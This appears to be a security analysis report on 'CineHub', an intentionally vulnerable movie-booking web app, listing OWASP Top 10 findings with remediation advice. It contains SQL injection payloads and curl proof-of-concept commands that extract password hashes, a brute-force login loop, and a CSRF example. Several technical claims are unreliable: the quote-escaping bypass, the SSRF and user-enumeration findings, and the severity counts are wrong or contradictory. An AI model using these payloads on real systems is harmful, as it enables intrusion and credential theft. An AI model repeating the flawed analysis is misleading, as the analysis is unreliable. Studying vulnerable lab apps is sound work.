# OWASP Vulnerabilities Analysis - CineHub Vulnerable Application

## Project Overview
This is a deliberately vulnerable movie booking web application (CineHub) built with:
- **Backend**: Node.js (Fastify) with TypeScript
- **Database**: PostgreSQL  
- **Frontend**: React with TypeScript
- **ORM**: Prisma (now converted to raw SQL for vulnerability demonstration)

---

## OWASP Top 10 Vulnerabilities Found

### 1. **A01:2021 – Broken Access Control**
**Severity**: High

#### Issues Found:
- **Missing authorization checks on certain endpoints**: The `/api/bookings/:id/cancel` endpoint checks if the user owns the booking, but this is done AFTER fetching (vulnerable to object reference bypass in raw SQL queries)
- **Implicit trust in JWT claims**: The application trusts `req.user.sub` directly without re-verifying user existence in critical operations
- **No rate limiting per user**: Rate limiting is global (120 requests/minute), not per-user, allowing abuse

**Location**: [backend/src/index.ts](backend/src/index.ts#L300-L320) - Booking cancellation endpoint

**Example Payload**:
```bash
# Attacker can cancel others' bookings by guessing booking IDs
POST /api/bookings/booking_abc123/cancel
Authorization: Bearer valid_token_for_different_user
```

---

### 2. **A02:2021 – Cryptographic Failures**
**Severity**: Critical

#### Issues Found:
- **Hardcoded JWT_SECRET in docker-compose.yml**: 
  ```yaml
  JWT_SECRET: change-me-to-a-long-random-string
  ```
  This is a placeholder that appears in version control

- **Weak secret generation for booking codes**: Uses `Math.random()` instead of cryptographically secure randomness:
  ```typescript
  const publicCode = `CNH${Math.random().toString(16).slice(2, 10).toUpperCase()}`;
  ```

- **Hardcoded database credentials**: 
  ```yaml
  POSTGRES_USER: postgres
  POSTGRES_PASSWORD: postgres
  ```

- **Passwords transmitted over potentially unencrypted connections**: Only CORS origin validation, no HTTPS enforced

**Location**: 
- [docker-compose.yml](docker-compose.yml#L6)
- [docker-compose.yml](docker-compose.yml#L19)
- [backend/src/index.ts](backend/src/index.ts#L239)

---

### 3. **A03:2021 – Injection (SQL Injection)**
**Severity**: Critical

#### Issues Found - **INTRODUCED BY SQL CONCATENATION CONVERSION**:

All the following endpoints are now vulnerable to SQL injection due to the conversion from Prisma ORM to raw concatenated SQL:

**1. Login endpoint** - Email parameter vulnerability:
```typescript
const email = body.email.replace(/'/g, "''");
const query = `SELECT * FROM "User" WHERE email = '${email}'`;
```
Using simple quote escaping is insufficient. Bypass: `admin') --`

**Vulnerable Endpoint**: [backend/src/index.ts#L178-L198](backend/src/index.ts#L178-L198)

**Attack Vector**:
```bash
POST /api/auth/login
Content-Type: application/json

{
  "email": "admin') --",
  "password": "anything"
}
```

**2. Movie search endpoint** - Query parameter injection:
```typescript
if (q.q) {
  whereClause += ` AND (title ILIKE '%${q.q.replace(/'/g, "''")}%' ...`;
}
```

**Vulnerable Endpoint**: [backend/src/index.ts#L62-L90](backend/src/index.ts#L62-L90)

**Attack Vector**:
```bash
GET /api/movies?q=') UNION SELECT id, email, passwordHash, null, null, null, null FROM "User" --
```

**3. Coupon validation endpoint**:
```typescript
const code = body.code.trim().toUpperCase().replace(/'/g, "''");
const query = `SELECT * FROM "Coupon" WHERE code = '${code}'`;
```

**Vulnerable Endpoint**: [backend/src/index.ts#L202-L215](backend/src/index.ts#L202-L215)

**4. Booking ID injection**:
```typescript
const bookingId = params.id.replace(/'/g, "''");
const query = `SELECT * FROM "Booking" WHERE id = '${bookingId}'`;
```

**Vulnerable Endpoint**: [backend/src/index.ts#L294-L314](backend/src/index.ts#L294-L314)

**5. Showtime queries** - Date/time injection possible:
```typescript
const dayStr = day.toISOString();
const query = `SELECT s.* FROM "Showtime" s WHERE s."movieId" = '${movieId}' AND s."startsAt" >= '${dayStr}'...`;
```

**Vulnerable Endpoint**: [backend/src/index.ts#L128-L140](backend/src/index.ts#L128-L140)

**Why Current Escaping Fails**:
- Simple single-quote escaping ('') is bypassable with:
  - Comment operators: `--`, `/**/`, `#`
  - UNION SELECT attacks
  - Boolean-based blind SQL injection
  - Time-based blind SQL injection
  - Stacked queries (depending on database driver)

---

### 4. **A05:2021 – Cross-Site Request Forgery (CSRF)**
**Severity**: Medium

#### Issues Found:
- **No CSRF tokens**: All state-changing operations (POST, DELETE) lack CSRF protection
- **CORS configured with credentials**: 
  ```typescript
  await app.register(cors, {
    origin: (origin, cb) => {
      if (!origin) return cb(null, true); // Allows null origin!
      const allowed = env.CORS_ORIGIN.split(",").map((s) => s.trim());
      cb(null, allowed.includes(origin));
    },
    credentials: true,  // Cookies/auth sent in CORS requests
  });
  ```

**Attack Scenario**:
1. Attacker hosts malicious website: `evil.com`
2. User authenticated on `cinehub.localhost` visits `evil.com`
3. Malicious JavaScript makes authenticated requests:
   ```javascript
   fetch('http://cinehub.localhost/api/bookings/user123/cancel', {
     method: 'POST',
     credentials: 'include'
   });
   ```

**Location**: [backend/src/index.ts#L28-L34](backend/src/index.ts#L28-V35)

---

### 5. **A06:2021 – Vulnerable and Outdated Components**
**Severity**: Medium

#### Issues Found:
- Using `@fastify/jwt` 9.1.0 - check for known vulnerabilities
- Using `@prisma/client` 6.19.3 - check for known vulnerabilities  
- Using `argon2` for password hashing (though this is good practice)

**Note**: Would require CVE cross-reference to find specific vulnerabilities.

---

### 6. **A07:2021 – Identification and Authentication Failures**
**Severity**: High

#### Issues Found:

**1. Weak JWT validation in signup**:
```typescript
const token = await reply.jwtSign({ sub: user[0].id, email: user[0].email }, {
  expiresIn: "7d",  // Very long expiration (7 days)
});
```

**2. No email verification**: Users can sign up with any email without verification

**3. No account lockout**: Brute force protection is missing:
```bash
# Attacker can brute force passwords indefinitely
for i in {1..100000}; do
  curl -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"email":"user@test.com","password":"attempt'$i'"}'
done
```

**4. Only rate limiting**: The only protection is global rate limiting:
```typescript
await app.register(rateLimit, {
  max: 120,
  timeWindow: "1 minute",  // Can still try 120 passwords per minute!
});
```

**5. Generic error messages leak user existence**:
```typescript
// Both return "INVALID_CREDENTIALS" - but could improve UX tracking
if (users.length === 0) return reply.code(401).send({ error: "INVALID_CREDENTIALS" });
const ok = await argon2.verify(user.passwordHash, body.password);
```

**Location**: [backend/src/index.ts#L140-L198](backend/src/index.ts#L140-L198)

---

### 7. **A08:2021 – Software and Data Integrity Failures**
**Severity**: Medium

#### Issues Found:
- **No HTTP security headers**: Missing headers like:
  - `Content-Security-Policy`
  - `X-Frame-Options`
  - `X-Content-Type-Options: nosniff`
  - `Strict-Transport-Security`
  - `X-XSS-Protection`

- **No input validation on some fields**: Seats array accepts any string:
  ```typescript
  seats: z.array(z.string().min(1).max(5)).min(1).max(10),
  // No format validation - could be XSS vectors if reflected
  ```

---

### 8. **A09:2021 – Logging and Monitoring Failures**
**Severity**: Medium

#### Issues Found:
- **Basic logging only**: 
  ```typescript
  app.setErrorHandler((err, _req, reply) => {
    const e: any = err;
    app.log.error(e);  // Generic error logging
  });
  ```

- **No security event logging**: Missing logs for:
  - Failed login attempts
  - SQL errors
  - Unauthorized access attempts
  - API rate limit exceeding
  - Data access patterns

- **No audit trail**: No way to track who did what and when (especially dangerous with SQL injection)

---

### 9. **A10:2021 – Server-Side Request Forgery (SSRF)**
**Severity**: Low

#### Issues Found:
- **Potential SSRF in payment intent endpoint** (though it's just mocked):
  ```typescript
  app.post("/api/payments/intent", async (req: any) => {
    const body = z.object({
      amountCents: z.number().int().min(0).max(1_000_000),
      currency: z.string().default("USD"),  // No validation!
    }).parse(req.body);
  });
  ```

If this connected to a real payment processor, the `currency` parameter could potentially be abused.

---

### 10. **A01:2021 – Broken Object Level Authorization (BOLA)**
**Severity**: High

#### Issues Found:

**Booking access control weakness**:
```typescript
const booking = await prisma.booking.findUnique({ where: { id: params.id } });
if (!booking) return reply.code(404).send({ error: "BOOKING_NOT_FOUND" });
if (booking.userId !== userId) return reply.code(403).send({ error: "FORBIDDEN" });
```

While this checks ownership, the booking ID is predictable (`booking_` + random hex).

**Attack**:
```bash
# Sequential guessing of booking IDs
GET /api/bookings/booking_1234567890
GET /api/bookings/booking_1234567891
GET /api/bookings/booking_1234567892
```

---

## Additional Security Issues (Not in Top 10)

### 11. **Insecure Direct Object References (IDOR)**
**Severity**: High

- **Movie/Showtime/Theater IDs**: Using CUID or simple patterns makes enumeration possible
- **User IDs in JWT**: Exposed in JWT payload (though this is standard, still a consideration)

---

### 12. **Cross-Site Scripting (XSS)** 
**Severity**: Medium

#### Issues Found:
- **Frontend stores JWT in localStorage** (if implemented that way):
  ```typescript
  // Vulnerable pattern (not shown in provided code but common):
  localStorage.setItem('token', token);
  ```
  XSS attack could steal token.

- **No Content Security Policy**: Frontend could be vulnerable to injected scripts

---

## SQL Injection Proof of Concept

### PoC 1: Extract User Credentials
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "admin@test.com'\'' OR '\''1'\''='\''1",
    "password": "x"
  }'
```

### PoC 2: Movie Search Union-Based Injection
```bash
curl "http://localhost:8080/api/movies?q='\
  UNION SELECT id, email, passwordHash, null, null, null, null FROM \"User\" --"
```

### PoC 3: Boolean-Based Blind SQL Injection
```bash
curl "http://localhost:8080/api/movies?q=' AND (SELECT COUNT(*) FROM \"User\" WHERE email LIKE '%admin%') > 0 --"
```

---

## Remediation Recommendations

### Critical (Fix Immediately):
1. **Revert SQL concatenation to Prisma ORM** - This was the secure approach
2. **Implement parameterized queries** if raw SQL is necessary
3. **Remove hardcoded credentials** from docker-compose.yml
4. **Rotate JWT_SECRET** to a long, random value
5. **Implement CSRF protection** using tokens or SameSite cookies

### High Priority:
1. Add email verification for account creation
2. Implement account lockout after failed login attempts
3. Add comprehensive security headers
4. Implement proper logging and monitoring
5. Add input validation sanitization

### Medium Priority:
1. Implement password strength requirements
2. Add two-factor authentication
3. Implement rate limiting per-user, not global
4. Add HTTPS enforcement
5. Implement security event logging

---

## Endpoints Security Summary

| Endpoint | Auth | Vulnerability | Severity |
|----------|------|----------------|----------|
| POST /api/auth/signup | None | SQL Injection (name, phone) | Critical |
| POST /api/auth/login | None | SQL Injection (email), Brute Force | Critical |
| GET /api/me | JWT | Possible privilege escalation | Medium |
| GET /api/movies | None | SQL Injection (search query) | Critical |
| GET /api/movies/:id | None | SQL Injection (movie ID) | Critical |
| GET /api/movies/:id/showtimes | None | SQL Injection (movie ID) | Critical |
| POST /api/coupons/validate | None | SQL Injection (coupon code) | Critical |
| POST /api/bookings | JWT | SQL Injection (showtime ID, seats) | Critical |
| GET /api/bookings | JWT | SQL Injection (user ID) | High |
| POST /api/bookings/:id/cancel | JWT | SQL Injection (booking ID), BOLA | Critical |

---

## Summary Statistics
- **Total Vulnerabilities Found**: 12+ (Beyond OWASP Top 10)
- **Critical**: 6
- **High**: 4  
- **Medium**: 2
- **Low**: 1

**Overall Risk Level**: 🔴 **CRITICAL**

This application is intentionally vulnerable for security testing/CTF purposes. DO NOT deploy to production without fixing all identified vulnerabilities.
